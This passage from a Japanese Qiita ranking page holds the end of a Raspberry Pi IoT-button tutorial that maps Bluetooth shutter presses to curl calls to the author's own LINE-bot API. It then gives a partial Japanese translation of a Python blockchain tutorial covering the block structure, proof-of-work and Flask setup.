<div class="code-frame" data-lang="ini"><div class="highlight"><pre><span></span><span class="na">keyup</span><span class="o">=</span><span class="s">curl -XPOST 'https://my-app.now.sh/postLineMessage'</span>
<span class="na">keydown</span><span class="o">=</span><span class="s">echo DOWN</span>
<span class="na">longup</span><span class="o">=</span><span class="s">echo LONG UP</span>
<span class="na">longdown</span><span class="o">=</span><span class="s">echo LONG DOWN</span>
</pre></div></div>

<p>ボタンが押されて離された時に、LINEへの投稿をトリガするAPI(<code>https://my-app.now.sh</code>)を叩く設定だよ。このAPIは次回以降で作っていくよ。それ以外の動作（ボタン長押しなど）は画面にログを出力するだけだよ。</p>

<div class="code-frame" data-lang="起動"><div class="highlight"><pre><span></span>$ bluebutton -d="Shutter3" -c ~/config/bluebutton
</pre></div></div>

<p>これで、リモートシャッターのボタンを押すとAPIにリクエストを投げるようになったよ。ボタン操作が認識されているか動作確認をしてみよう。</p>

<p><a href="https://camo.qiitausercontent.com/bef3c0fbeec36321f4c14ec014051b13654d32c2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3136303435312f66363437303965302d313164622d373239382d353639382d6563633635626561303138332e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/bef3c0fbeec36321f4c14ec014051b13654d32c2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3136303435312f66363437303965302d313164622d373239382d353639382d6563633635626561303138332e676966" alt="Graphics Interchange Format（GIF）-2C5CA608C17A-1.gif" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/160451/f64709e0-11db-7298-5698-ecc65bea0183.gif"></a></p>

<p>上の画像では、ラズパイにMacからログインしてbluebuttonの実行画面を表示させてるよ。10mくらい離れてもボタン操作を検知してくれたよ。<br>
次回は、Node.jsをつかってLINEボットに投稿するAPIを開発、Now.shにデプロイし、IoTボタンを完成させるよ。</p>

<h2>
<span id="追記" class="fragment"></span><a href="#%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>追記</h2>

<ul>
<li><p>LINE Botに通知するための<a href="https://qiita.com/vimyum/items/2226daa74444575811b5" id="reference-688b85869f1b104a992b">続きの記事</a>を書いたよ。でも、あまりIoTボタンとは関係ないよ。。</p></li>
<li><p>ボタン操作が検知されたかどうかわかりづらいとのご指摘があるし、実際そのとおりだ。僕はラズパイにスピーカーを繋いで、ボタン操作検知時にラズパイに喋らせているよ。</p></li>
</ul>

<div class="code-frame" data-lang="bash"><div class="highlight"><pre><span></span>$ npm install openjtalk
</pre></div></div>

<div class="code-frame" data-lang="js">
<div class="code-lang"><span class="bold">speak.js</span></div>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">OpenJTalk</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'openjtalk'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">mei</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OpenJTalk</span><span class="p">();</span>
<span class="nx">mei</span><span class="p">.</span><span class="nx">talk</span><span class="p">(</span><span class="s1">'ボタンが押されたよ'</span><span class="p">,</span> <span class="mi">250</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">config/bluebutton</span></div>
<div class="highlight"><pre><span></span>keyup=node ~/speak.js &amp;&amp; curl -XPOST https://xxx.now.sh -d '{msg: "xx"}'
</pre></div>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">13位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>528</kbd>
		<a target="_blank" href="https://qiita.com/hidehiro98/items/841ece65d896aeaa8a2a">ブロックチェーンを作ることで学ぶ 〜ブロックチェーンがどのように動いているのか学ぶ最速の方法は作ってみることだ〜</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-13<br />13:37:47</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/68213.html">hidehiro98</a>(15件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/68213/profile-images/1473697771">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[python3]</b> <b>[Bitcoin]</b> <b>[Blockchain]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="この記事について" class="fragment"></span><a href="#%E3%81%93%E3%81%AE%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>この記事について</h1>

<p>この記事は<a href="https://medium.com/@vanflymen" rel="nofollow noopener" target="_blank">Daniel van Flymen</a>さんの<a href="https://hackernoon.com/learn-blockchains-by-building-one-117428612f46" rel="nofollow noopener" target="_blank">Learn Blockchains by Building One　- The fastest way to learn how Blockchains work is to build one</a>を本人の許可を得て翻訳したものです。</p>

<p><a href="https://github.com/dvf/blockchain" rel="nofollow noopener" target="_blank">このブロックチェーンのリポジトリ</a>ではPython以外での言語の実装者の募集も行われているので、興味がある方は是非。<br>
また、この翻訳で出てくる日本語版のリポジトリは<a href="https://github.com/hidehiro98/blockchain_by_dvf" rel="nofollow noopener" target="_blank">こちら</a>にあるので参考にしてみてください。</p>

<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>あなたがここにいるのは、私と同じように、暗号通貨の盛り上がりに対して心構えが出来ているからだ。そしてあなたはブロックチェーンがどのように動いているのか　-その裏にある基本的なテクノロジー- を理解したいと思っている。</p>

<p>しかしブロックチェーンを理解するのは簡単ではない、少なくとも私にとっては簡単ではなかった。私は多くのビデオを見て、抜け漏れの多いチュートリアルをこなし、少なすぎる事例から来るフラストレーションに苦しんでいた。</p>

<p>私は手を動かして学ぶことが好きだ。手を動かすことは私を、抽象的なことをコードのレベルで扱うことを強制し、コードのレベルで扱うことにより抽象的なことが頭に定着する。もしあなたが同じことをすれば、このガイドが終わる頃には動いているブロックチェーンが、確かな理解とともに手に入るだろう。</p>

<h1>
<span id="始める前に" class="fragment"></span><a href="#%E5%A7%8B%E3%82%81%E3%82%8B%E5%89%8D%E3%81%AB"><i class="fa fa-link"></i></a>始める前に</h1>

<p>ブロックチェーンとは、<em>不変の、連続した</em>ブロックと呼ばれる記録のチェーンであることを覚えておいてほしい。ブロックは取引、ファイルやあらゆるデータを格納することが出来る。しかし重要なことは、<em>ハッシュ</em>を使って<em>繋がっている</em>ということだ。</p>

<p>もしハッシュが何かについて自信がない場合は、<a href="https://learncryptography.com/hash-functions/what-are-hash-functions" rel="nofollow noopener" target="_blank">ここ</a>に例がある。</p>

<p><strong>この記事の対象者は？</strong>　以下が必要な要素だ。基本的なPythonの読み書きが出来ること、HTTPリクエストがどのように働くかについての理解していること（私達のブロックチェーンはHTTPを介して動くためだ）。</p>

<p><strong>何が必要ですか？</strong>　Python 3.6以上と<code>pip</code>がインストールされていることが必要だ。また、Flaskと素晴らしいRequest libraryもインストールする必要がある。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>pip install Flask==0.12.2 requests==2.18.4
</pre></div></div>

<p>そうだった、PostmanやcURLのようなHTTPクライアントも必要だ。まあ動けばなんでも大丈夫だ。</p>

<p><strong>最終的なコードはどこ？</strong>　ソースコードは<a href="https://github.com/dvf/blockchain" rel="nofollow noopener" target="_blank">ここ</a>にある。</p>

<h1>
<span id="ステップ1-ブロックチェーンを作る" class="fragment"></span><a href="#%E3%82%B9%E3%83%86%E3%83%83%E3%83%971-%E3%83%96%E3%83%AD%E3%83%83%E3%82%AF%E3%83%81%E3%82%A7%E3%83%BC%E3%83%B3%E3%82%92%E4%BD%9C%E3%82%8B"><i class="fa fa-link"></i></a>ステップ1: ブロックチェーンを作る</h1>

<p>あなたの好きなエディタかIDEを開いてほしい、個人的には<a href="https://www.jetbrains.com/pycharm/" rel="nofollow noopener" target="_blank">PyCharm</a>が好きだ。そして<code>blockchain.py</code>という新しいファイルを作る。私たちは一つのファイルしか使わないが、もしどこにいるのかわからなくなったら、いつでも<a href="https://github.com/dvf/blockchain" rel="nofollow noopener" target="_blank">ソースコード</a>を参照することが出来る。</p>

<h2>
<span id="ブロックチェーンを書く" class="fragment"></span><a href="#%E3%83%96%E3%83%AD%E3%83%83%E3%82%AF%E3%83%81%E3%82%A7%E3%83%BC%E3%83%B3%E3%82%92%E6%9B%B8%E3%81%8F"><i class="fa fa-link"></i></a>ブロックチェーンを書く</h2>

<p>私たちがつくる<code>Blockchain</code>クラスのコンストラクタが、ブロックチェーンを納めるための最初の空のリストと、トランザクションを納めるための空のリストを作る。これが私たちのクラスの設計図だ。</p>

<div class="code-frame" data-lang="python">
<div class="code-lang"><span class="bold">blockchain.py</span></div>
<div class="highlight"><pre><span></span><span class="c1"># coding: UTF-8</span>

<span class="k">class</span> <span class="nc">Blockchain</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">chain</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">current_transactions</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">def</span> <span class="nf">new_block</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># 新しいブロックを作り、チェーンに加える</span>
        <span class="k">pass</span>

    <span class="k">def</span> <span class="nf">new_transaction</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1">#　新しいトランザクションをリストに加える</span>
        <span class="k">pass</span>

    <span class="nd">@staticmethod</span>
    <span class="k">def</span> <span class="nf">hash</span><span class="p">(</span><span class="n">block</span><span class="p">):</span>
        <span class="c1"># ブロックをハッシュ化する</span>
        <span class="k">pass</span>

    <span class="nd">@property</span>
    <span class="k">def</span> <span class="nf">last_block</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># チェーンの最後のブロックをリターンする</span>
        <span class="k">pass</span>
</pre></div>
</div>

<p>私たちの<code>Blockchain</code>クラスはチェーンの取り扱いを司っている。チェーンはトランザクションを収納し、新しいブロックをチェーンに加えるためのヘルパーメソッドを持っている。早速いくつかのメソッドを肉付けしていこう。</p>

<h2>
<span id="ブロックとはどのようなものなのか" class="fragment"></span><a href="#%E3%83%96%E3%83%AD%E3%83%83%E3%82%AF%E3%81%A8%E3%81%AF%E3%81%A9%E3%81%AE%E3%82%88%E3%81%86%E3%81%AA%E3%82%82%E3%81%AE%E3%81%AA%E3%81%AE%E3%81%8B"><i class="fa fa-link"></i></a>ブロックとはどのようなものなのか</h2>

<p>それぞれのブロックは、<em>インデックス</em>、<em>タイムスタンプ</em>（UNIXタイム）、<em>トランザクションのリスト</em>、<em>プルーフ</em>（詳細は後ほど）そして<em>それまでのブロックのハッシュ</em>を持っている。</p>

<p>これが一つのブロックの例だ。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>block = {
    'index': 1,
    'timestamp': 1506057125.900785,
    'transactions': [
        {
            'sender': "8527147fe1f5426f9dd545de4b27ee00",
            'recipient': "a77f5cdfa2934df3954a5c7c7da5df1f",
            'amount': 5,
        }
    ],
    'proof': 324984774000,
    'previous_hash': "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
}
</pre></div></div>

<p>この時点で、チェーンのアイデアは明確だ -全ての新しいブロックはそれまでのブロックのハッシュを自分自身の中に含んでいる。<strong>これこそがまさにブロックチェーンに不変性を与えているものであり、そのために重要なポイントだ</strong>。もしアタッカーがチェーン初期のブロックを破壊した場合、それに続く<strong>全て</strong>のブロックが不正なハッシュを含むことになる。</p>

<p><em>この意味がわかるだろうか？もし分からなければ、少し考える時間を取ってほしい -これはブロックチェーンのコアとなるアイデアだ。</em></p>

<h2>
<span id="トランザクションをブロックに加える" class="fragment"></span><a href="#%E3%83%88%E3%83%A9%E3%83%B3%E3%82%B6%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E3%83%96%E3%83%AD%E3%83%83%E3%82%AF%E3%81%AB%E5%8A%A0%E3%81%88%E3%82%8B"><i class="fa fa-link"></i></a>トランザクションをブロックに加える</h2>

<p>私たちにはトランザクションをブロックに加える方法が必要だ。<code>new_transaction()</code>メソッドがそれを司っており、非常に簡単だ。</p>

<div class="code-frame" data-lang="python">
<div class="code-lang"><span class="bold">blockchain.py</span></div>
<div class="highlight"><pre><span></span><span class="c1"># coding: UTF-8</span>

<span class="k">class</span> <span class="nc">Blockchain</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="o">...</span>

    <span class="k">def</span> <span class="nf">new_transaction</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sender</span><span class="p">,</span> <span class="n">recipient</span><span class="p">,</span> <span class="n">amount</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        次に採掘されるブロックに加える新しいトランザクションを作る</span>
<span class="sd">        :param sender: &lt;str&gt; 送信者のアドレス</span>
<span class="sd">        :param recipient: &lt;str&gt; 受信者のアドレス</span>
<span class="sd">        :param amount: &lt;int&gt; 量</span>
<span class="sd">        :return: &lt;int&gt; このトランザクションを含むブロックのアドレス</span>
<span class="sd">        """</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">current_transactions</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
            <span class="s1">'sender'</span><span class="p">:</span> <span class="n">sender</span><span class="p">,</span>
            <span class="s1">'recipient'</span><span class="p">:</span> <span class="n">recipient</span><span class="p">,</span>
            <span class="s1">'amount'</span><span class="p">:</span> <span class="n">amount</span><span class="p">,</span>
        <span class="p">})</span>

        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">last_block</span><span class="p">[</span><span class="s1">'index'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span>
</pre></div>
</div>

<p><code>new_transaction()</code>メソッドは、新しいトランザクションをリストに加えた後、そのトランザクションが加えられるブロック -<em>次に採掘されるブロックだ</em>-の<em>インデックス</em>をリターンする。</p>

<h2>
<span id="新しいブロックを作る" class="fragment"></span><a href="#%E6%96%B0%E3%81%97%E3%81%84%E3%83%96%E3%83%AD%E3%83%83%E3%82%AF%E3%82%92%E4%BD%9C%E3%82%8B"><i class="fa fa-link"></i></a>新しいブロックを作る</h2>

<p>我々の<code>Blockchain</code>がインスタンス化されるとき、私たちは<em>ジェネシス</em>ブロック　-先祖を持たないブロック- とともにシードする必要がある。それと同時に、ジェネシスブロックに<em>プルーフ</em> -マイニング（またはプルーフ・オブ・ワーク）の結果- も加える必要がある。マイニングについては後で取り上げる。</p>

<p><em>ジェネシス</em>ブロックを加えるのと同時に、<code>new_block()</code>メソッド、<code>last_block()</code>メソッドと<code>hash()</code>メソッドも作成しよう。</p>

<div class="code-frame" data-lang="python">
<div class="code-lang"><span class="bold">blockchain.py</span></div>
<div class="highlight"><pre><span></span><span class="c1"># coding: UTF-8</span>

<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>


<span class="k">class</span> <span class="nc">Blockchain</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">current_transactions</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">chain</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="c1"># ジェネシスブロックを作る</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">new_block</span><span class="p">(</span><span class="n">previous_hash</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">proof</span><span class="o">=</span><span class="mi">100</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">new_block</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proof</span><span class="p">,</span> <span class="n">previous_hash</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        ブロックチェーンに新しいブロックを作る</span>
<span class="sd">        :param proof: &lt;int&gt; プルーフ・オブ・ワークアルゴリズムから得られるプルーフ</span>
<span class="sd">        :param previous_hash: (オプション) &lt;str&gt; 前のブロックのハッシュ</span>
<span class="sd">        :return: &lt;dict&gt; 新しいブロック</span>
<span class="sd">        """</span>

        <span class="n">block</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">'index'</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">chain</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s1">'timestamp'</span><span class="p">:</span> <span class="n">time</span><span class="p">(),</span>
            <span class="s1">'transactions'</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_transactions</span><span class="p">,</span>
            <span class="s1">'proof'</span><span class="p">:</span> <span class="n">proof</span><span class="p">,</span>
            <span class="s1">'previous_hash'</span><span class="p">:</span> <span class="n">previous_hash</span> <span class="ow">or</span> <span class="bp">self</span><span class="o">.</span><span class="n">hash</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">chain</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span>
        <span class="p">}</span>

        <span class="c1"># 現在のトランザクションリストをリセット</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">current_transactions</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">chain</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">block</span>

    <span class="k">def</span> <span class="nf">new_transaction</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sender</span><span class="p">,</span> <span class="n">recipient</span><span class="p">,</span> <span class="n">amount</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        次に採掘されるブロックに加える新しいトランザクションを作る</span>
<span class="sd">        :param sender: &lt;str&gt; 送信者のアドレス</span>
<span class="sd">        :param recipient: &lt;str&gt; 受信者のアドレス</span>
<span class="sd">        :param amount: &lt;int&gt; 量</span>
<span class="sd">        :return: &lt;int&gt; このトランザクションを含むブロックのアドレス</span>
<span class="sd">        """</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">current_transactions</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
            <span class="s1">'sender'</span><span class="p">:</span> <span class="n">sender</span><span class="p">,</span>
            <span class="s1">'recipient'</span><span class="p">:</span> <span class="n">recipient</span><span class="p">,</span>
            <span class="s1">'amount'</span><span class="p">:</span> <span class="n">amount</span><span class="p">,</span>
        <span class="p">})</span>

        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">last_block</span><span class="p">[</span><span class="s1">'index'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span>

    <span class="nd">@property</span>
    <span class="k">def</span> <span class="nf">last_block</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">chain</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

    <span class="nd">@staticmethod</span>
    <span class="k">def</span> <span class="nf">hash</span><span class="p">(</span><span class="n">block</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        ブロックの　SHA-256　ハッシュを作る</span>
<span class="sd">        :param block: &lt;dict&gt; ブロック</span>
<span class="sd">        :return: &lt;str&gt;</span>
<span class="sd">        """</span>

        <span class="c1"># 必ずディクショナリ（辞書型のオブジェクト）がソートされている必要がある。そうでないと、一貫性のないハッシュとなってしまう</span>
        <span class="n">block_string</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">block_string</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

</pre></div>
</div>

<p>ここで追加したものは非常に簡単なはずだ。何をしたかをクリアにしておくために、いくつかのコメントと<em>docstrings</em>を加えておいた。我々のブロックチェーンはもうすぐ完成だ。だがしかし、ここで新しいブロックかどのように出来るのかを考える必要がある　-鋳造　(forged) か採掘 (mined) か-</p>

<h2>
<span id="プルーフオブワークを理解する" class="fragment"></span><a href="#%E3%83%97%E3%83%AB%E3%83%BC%E3%83%95%E3%82%AA%E3%83%96%E3%83%AF%E3%83%BC%E3%82%AF%E3%82%92%E7%90%86%E8%A7%A3%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>プルーフ・オブ・ワークを理解する</h2>

<p>プルーフ・オブ・ワークアルゴリズム (PoW) とは、ブロックチェーン上でどのように新しいブロックが作られるか、または<em>採掘</em>されるかということを表している。PoWのゴールは、問題を解く番号を発見することだ。その番号はネットワーク上の誰からも<strong>見つけるのは難しく、確認するのは簡単</strong> -コンピュータ的に言えば- なものでなければならない。これがプルーフ・オブ・ワークのコアとなるアイデアだ。</p>

<p>理解するために簡単な例を見てみよう。</p>

<p>ある整数<code>x</code>かけるある整数<code>y</code>の<em>hash</em>が0で終わらないといけないとしよう。というわけで、<code>hash(x * y) = ac23d...0</code>というようになる。そしてこの簡単な例では、<code>x = 5</code>と固定しよう。Pythonで実装するとこうなる。</p>

<div class="code-frame" data-lang="python"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>

<span class="n">x</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">y</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># まだこのyがどの数字であるべきかはわからない</span>

<span class="k">while</span> <span class="n">sha256</span><span class="p">(</span><span class="n">f</span><span class="s1">'{x*y}'</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">"0"</span><span class="p">:</span>
    <span class="n">y</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s1">'The solution is y = {y}'</span><span class="p">)</span>
</pre></div></div>

<p>解は<code>y = 21</code>。よってそれにより作られたハッシュは<code>0</code>で終わる。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>&gt;&gt;&gt; sha256(f'{5*21}'.encode()).hexdigest()
'1253e9373e781b7500266caa55150e08e210bc8cd8cc70d89985e3600155e860'
</pre></div></div>

<p>ビットコインでは、プルーフ・オブ・ワークのアルゴリズムは<a href="https://en.wikipedia.org/wiki/Hashcash" rel="nofollow noopener" target="_blank">ハッシュキャッシュ　 (Hashcash)</a>と呼ばれている。そしてそれはこの基本的な例とそこまで違うものではない。ハッシュキャッシュは、採掘者が競い合って新しいブロックを作るために問題を解く、というものだ。一般的に、難易度は探す文字の数によって決まる。採掘者はその解に対して、報酬としてトランザクションの中でコインを受け取る。</p>

<p>ネットワークは<em>簡単に</em>採掘者の解が正しいかを確認することが出来る。</p>

<h2>
<span id="基本的なプルーフオブワークを実装する" class="fragment"></span><a href="#%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E3%83%97%E3%83%AB%E3%83%BC%E3%83%95%E3%82%AA%E3%83%96%E3%83%AF%E3%83%BC%E3%82%AF%E3%82%92%E5%AE%9F%E8%A3%85%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>基本的なプルーフ・オブ・ワークを実装する</h2>

<p>私たちのブロックチェーンのために似たアルゴリズムを実装しよう。ルールは上の例と似ている。</p>

<p>前のブロックの解とともにハッシュを作ったときに、最初に4つの<code>0</code>が出てくるような番号<code>p</code>を探そう。</p>

<div class="code-frame" data-lang="python">
<div class="code-lang"><span class="bold">blockchain.py</span></div>
<div class="highlight"><pre><span></span><span class="c1"># coding: UTF-8</span>

<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
<span class="kn">from</span> <span class="nn">uuid</span> <span class="kn">import</span> <span class="n">uuid4</span>

<span class="k">class</span> <span class="nc">Blockchain</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="o">...</span>

    <span class="k">def</span> <span class="nf">proof_of_work</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">last_proof</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        シンプルなプルーフ・オブ・ワークのアルゴリズム:</span>
<span class="sd">         - hash(pp') の最初の4つが0となるような p' を探す</span>
<span class="sd">         - p は前のプルーフ、 p' は新しいプルーフ</span>
<span class="sd">        :param last_proof: &lt;int&gt;</span>
<span class="sd">        :return: &lt;int&gt;</span>
<span class="sd">        """</span>

        <span class="n">proof</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">valid_proof</span><span class="p">(</span><span class="n">last_proof</span><span class="p">,</span> <span class="n">proof</span><span class="p">)</span> <span class="ow">is</span> <span class="bp">False</span><span class="p">:</span>
            <span class="n">proof</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="k">return</span> <span class="n">proof</span>

    <span class="nd">@staticmethod</span>
    <span class="k">def</span> <span class="nf">valid_proof</span><span class="p">(</span><span class="n">last_proof</span><span class="p">,</span> <span class="n">proof</span><span class="p">):</span>
        <span class="sd">"""</span>
<span class="sd">        プルーフが正しいかを確認する: hash(last_proof, proof)の最初の4つが0となっているか？</span>
<span class="sd">        :param last_proof: &lt;int&gt; 前のプルーフ</span>
<span class="sd">        :param proof: &lt;int&gt; 現在のプルーフ</span>
<span class="sd">        :return: &lt;bool&gt; 正しければ true 、そうでなれけば false</span>
<span class="sd">        """</span>

        <span class="n">guess</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'{last_proof}{proof}'</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="n">guess_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

        <span class="k">return</span> <span class="n">guess_hash</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"0000"</span>
</pre></div>
</div>

<p>アルゴリズムの難易度を調整するためには、最初の0の数を変えることで出来る。しかし4は充分な数だ。0を一つ加えることで、解を見つけるための時間にマンモス級の違いが出ることに気がつくだろう。</p>

<p>私たちのクラスはほとんど完成しているので、HTTPリクエストとともにこのクラスを使ってみよう。</p>

<h1>
<span id="ステップ2-apiとしての私たちのブロックチェーン" class="fragment"></span><a href="#%E3%82%B9%E3%83%86%E3%83%83%E3%83%972-api%E3%81%A8%E3%81%97%E3%81%A6%E3%81%AE%E7%A7%81%E3%81%9F%E3%81%A1%E3%81%AE%E3%83%96%E3%83%AD%E3%83%83%E3%82%AF%E3%83%81%E3%82%A7%E3%83%BC%E3%83%B3"><i class="fa fa-link"></i></a>ステップ2: APIとしての私たちのブロックチェーン</h1>

<p>ここではPython Flaskフレームワークを使う。Flaskはマイクロフレームワークであり、簡単にエンドポイントをPythonのファンクションに対応させることが出来る。そして、私たちのブロックチェーンがHTTPリクエストを使ってWebで通信することが出来るようになる。</p>

<p>ここでは3つのメソッドを作る:<br>
* ブロックへの新しいトランザクションを作るための<code>/transactions/new</code><br>
* サーバーに対して新しいブロックを採掘するように伝える<code>/mine</code><br>
* フルブロックチェーンを返す<code>/chain</code></p>

<h2>
<span id="flaskをセットアップする" class="fragment"></span><a href="#flask%E3%82%92%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Flaskをセットアップする</h2>

<p>サーバーは、このブロックチェーンのネットワークに一つのノードを作り出す。早速いくつかの例となるコードを作ろう。</p>

<div class="code-frame" data-lang="python">
<div class="code-lang"><span class="bold">blockchain.py</span></div>
<div class="highlight"><pre><span></span><span class="c1"># coding: UTF-8</span>

<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">from</span> <span class="nn">textwrap</span> <span class="kn">import</span> <span class="n">dedent</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
<span class="kn">from</span> <span class="nn">uuid</span> <span class="kn">import</span> <span class="n">uuid4</span>

<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>

<span class="k">class</span> <span class="nc">Blockchain</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="o">...</span>


<span class="c1"># ノードを作る</span>
